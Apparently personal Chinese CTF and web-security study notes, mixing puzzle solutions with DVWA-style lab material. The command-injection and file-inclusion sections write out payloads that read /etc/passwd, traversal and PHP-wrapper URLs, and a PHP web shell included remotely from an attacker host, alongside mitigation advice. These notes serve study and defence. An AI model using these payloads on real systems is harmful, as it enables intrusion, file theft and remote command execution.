

## 一个按钮被禁用，点击无效

在 CTF 前端题目中，按钮无法点击通常是由于 HTML 中的 *disabled* 属性限制了按钮的交互功能。通过修改前端代码，可以绕过限制并获取目标内容。

```html
<input type="button" value="Submit" disabled>
```

解决方法:

1. 使用开发者工具移除 disabled 属性

按下 *F12* 打开*浏览器开发者工具*，找到对应的按钮元素，将 disabled 属性删除。

```html
<input type="button" value="Submit">
```

2.  修改 disabled 属性值

将 *disabled* 属性的值改为 *false* 或其他无效值，使其失效

```html
<input type="button" value="Submit" disabled="false">
```

3. 使用 JavaScript 操作 DOM

通过控制台输入 JavaScript 代码动态移除 *disabled* 属性

```javascript
document.querySelector('input[type="button"]').removeAttribute('disabled');
```





## MISC：键盘隐写

[MISC题目中一种键盘类型布局对应相关的隐写 - 知乎](https://zhuanlan.zhihu.com/p/51934767)

国内常用键盘：QWERTY键盘 

工具转Dvorak键盘 [Will's Qwerty to Dvorak Converter](https://wbic16.xedoloh.com/dvorak.html)



## 诺基亚键盘

隔壁老王发来的短信：

33 53 21 41 31 51  52 63 81 82 92 21

f l a g d j k o t u x a       33 : 3号键第三个字母F

<img src="CTF.assets/image-20251030204004065.png" alt="image-20251030204004065" style="zoom: 50%;" />



## 攻防世界crypto进阶区--告诉你个秘密

[攻防世界crypto进阶区--告诉你个秘密_636a56355279427363446c4a49454a7154534230526d6843 5-CSDN博客](https://blog.csdn.net/qq_46927150/article/details/105907158)

```
636A56355279427363446C4A49454A7154534230526D6843
56445A31614342354E326C4B4946467A5769426961453067
```

十六进制 转 字符串

```
cjV5RyBscDlJIEJqTSB0RmhCVDZ1aCB5N2lKIFFzWiBiaE0g
```

尝试 base64 解码    [在线Base64解码工具 – 免费解码文本和文件 - EditTools](https://edittools.org/zh-cn/base64-tools/base64-decode)

```
r5yG lp9I BjM tFhBT6uh y7iJ QsZ bhM 
```

参考键盘，一组几个字母在键盘上围出了一个字母     r5yG -> T











## Command Injection

- 管道符`|`
- 换行符`\n`（URL编码为%0A）
- 后台运行符`&`
- 命令替换符```（反引号）
- 逻辑或`||`

例如，攻击者可以输入：

```
 8.8.8.8 | cat /etc/passwd
 8.8.8.8 |cat /etc/passwd 	# '| ' => ''  // 只过滤 "| "（管道符+空格）
 8.8.8.8 \n cat /etc/passwd
 8.8.8.8 & cat /etc/passwd
 8.8.8.8 `cat /etc/passwd`		# ` => %60
 8.8.8.8 || cat /etc/passwd
 8.8.8.8 $(ls)
 8.8.8.8%0Als -al	#  换行符注入
 8.8.8.8%26%26cat%20/etc/passwd  # URL编码绕过	& => %26   ' ' => %20
```

建议：
使用白名单验证，例如只允许输入IP地址格式（或域名格式），或者使用 escapeshellarg() 函数对输入进行转义。









## CSRF 跨站请求伪造

















## File Inclusion（文件包含）

通过PHP的函数引入文件时，传入的文件名没有经过合理的校验，而操作了预想之外的文件......

文件包含漏洞在PHP Web Application中居多，而在JSP,ASP,ASP.NET程序中却非常少

 **PHP常见的导致文件包含的函数：*include()、include_once()、require()、require_once()*、fopen()、readfile()**

前4个函数包含一个新的文件时，只要文件内容符合PHP语法规范，那么任何扩展名都可以被PHP解析。包含非PHP语法规范源文件时，将会暴露其源代码，后2个函数会造成敏感文件被读取。

文件包含漏洞的两个条件： 1.include()等函数通过动态变量的方式引入需要包含的文件； 2.用户能够控制该动态变量。

**远程文件包含**：开启了php配置中的allow_url_fopen选项（选项开启之后，服务器允许包含一个远程的文件）

**本地文件包含**：当服务器开启allow_url_include选项时，利用url去动态包含文件 

```php
<?php
$file = $_GET[‘file’];
if (file_exists(‘/home/wwwrun’.$file.’.php’))
{
include ‘/home/wwwrun’.$file.’.php’;
}
?>
# 若$file的值为“../../etc/passwd” 相当于 include ‘/home/wwwrun/../../etc/passwd.php’

	可以利用%00截断（如果PHP版本<5.3.4）或者使用目录遍历技巧来包含任意文件。
	这个文件是不存在的，字符串截断技巧：PHP内核是由C语言实现，使用了C语言中的一些字符串处理函数。在连接字符串时，0字节（\x00）将作为字符串结束符。所以在这个地方，攻击者只要在最后加入一个0字节，就能截断file变量之后的字符串，即：../../etc/passwd\0，通过Web输入时，只需要UrlEncode，变成../../etc/passwd%00。 
	“../../../”的方式又被称为“目录遍历”。
	可以通过配置PHP的open_basedir来限制，其作用是限制在某个特定目录下PHP能打开的文件。例如open_basedir = D:\soft\develop\env\sites\www.a.com\，在windows下多个目录应当用分号隔开，在Linux下则用冒号隔开。
```

### 本地文件包含（LFI）

读取系统文件（如/etc/passwd）：  			PHP版本<5.3.4

```php
http://192.168.203.1/vuln.php?file=../../../../etc/passwd%00
http://192.168.203.1/vuln.php?file=../../../../etc/passwd\0
```

使用PHP包装器读取PHP文件源码：

```php
// 不需要截断，因为php://filter这种流式包装器不需要文件存在，而且resource后面可以跟任意文件，即使加了.php，我们也可以通过目录遍历往上跳。
http://192.168.203.1/vuln.php?file=php://filter/convert.base64-encode/resource=../../../../etc/passwd
// 数据流包装器
http://192.168.203.1/vuln.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=
// 使用不存在的中间目录
http://192.168.203.1/vuln.php?file=non_exist/../../etc/passwd
// 双重编码绕过
http://192.168.203.1/vuln.php?file=%2561%2562%2563/../../etc/passwd
// 点号变体
http://192.168.203.1/vuln.php?file=....//....//etc/passwd
```

```php
// 代码中会添加.php，所以如果我们想读取index.php，可以这样：
http://192.168.203.1/vuln.php?file=php://filter/convert.base64-encode/resource=index
```

实际上，包含的是index.php，然后通过base64编码输出，我们再解码就能得到源代码。

### 远程文件包含（RFI）

如果服务器配置了**allow_url_include=On**，**allow_url_fopen = On**那么我们可以包含一个远程的恶意脚本。

假设我们在kali上搭建一个HTTP服务，并在根目录下放置一个名为shell.txt的文本文件，内容为：

```php
<?php system($_GET['cmd']); ?>
```

然后，我们通过漏洞包含这个远程文件：

```php
// 包含远程恶意脚本
http://192.168.203.1/vuln.php?file=http://192.168.203.2/shell.txt%00
// 使用FTP协议
http://192.168.203.1/vuln.php?file=ftp://192.168.203.2/malicious.php
// 压缩流包装器
http://192.168.203.1/vuln.php?file=compress.zlib://http://192.168.203.2/shell.txt
```

这样，就会包含我们kali上的shell.txt，并执行其中的PHP代码。然后，我们可以通过传递cmd参数执行任意命令，例如：

```php
http://192.168.203.1/vuln.php?file=http://192.168.203.2/shell.txt&cmd=whoami
```

注意：由于代码会添加.php，所以我们需要用%00截断，或者确保远程文件路径中不包含空格，并且服务器能够正确解析。另外，如果远程文件是PHP代码，那么它会被执行，而不在乎扩展名是什么。

但是，如果无法截断，那么请求的URL会变成http://192.168.203.2/shell.txt.php，可能不存在。所以，我们可以在kali上将文件命名为shell.txt.php，或者利用Apache的MultiViews等功能，使shell.txt被当作PHP解析。

另一种方法是，我们可以使用PHP的input流，通过POST传递代码，但这里需要allow_url_include开启，并且我们能够控制完整的URL（即不需要添加.php后缀）。如果必须添加.php，那么这种方法可能不行。

### 日志文件注入

```php
// 通过User-Agent注入PHP代码
// 然后包含日志文件
http://192.168.203.1/vuln.php?file=../../../../var/log/apache2/access.log

// Windows系统日志
http://192.168.203.1/vuln.php?file=../../../../Windows/system32/logfiles/xxx.log
```

###  Session文件包含

```php
// 在session中注入代码，然后包含session文件
http://192.168.203.1/vuln.php?file=../../../../tmp/sess_[session_id]
```

### 安全包含

```php
// 固定目录+后缀
$base_dir = '/var/www/includes/';
$file = $base_dir . basename($_GET['file']) . '.php';
if (file_exists($file)) {
    include($file);
}

// 输入验证
// 白名单验证
$allowed_files = ['home.php', 'about.php'];// 只包含 home.php 和 about.php这两个文件
if (in_array($_GET['file'], $allowed_files)) {
    include($_GET['file']);
}
// 路径验证
$file = basename($_GET['file']);	
if (preg_match('/^[a-zA-Z0-9_-]+\.php$/', $file)) {		// shell.php会被包含
    include($file);
}
// 改进
$file = basename($_GET['file']);
$path = '/path/to/includes/';						  // 固定路径 
if (preg_match('/^[a-zA-Z0-9_-]+\.php$/', $file)) {
    include($path . $file);
}

// php.ini安全配置 (环境配置)
php.ini安全配置
allow_url_fopen = Off
allow_url_include = Off
open_basedir = /var/www/html
```







## File Upload	（文件上传）

[文件上传漏洞思路详解 - 星海河 - 博客园](https://www.cnblogs.com/xinghaihe/p/18422193)

[一文吃透文件上传漏洞！路径遍历、后缀绕过、ZIP炸弹全解析 | CN-SEC 中文网](https://cn-sec.com/archives/3965389.html)













## JavaScript Attack     

[DVWA 通关指南：JavaScript Attacks (前端攻击) - 乌漆WhiteMoon - 博客园](https://www.cnblogs.com/linfangnan/p/13739003.html#javascript-attacks-前端攻击)



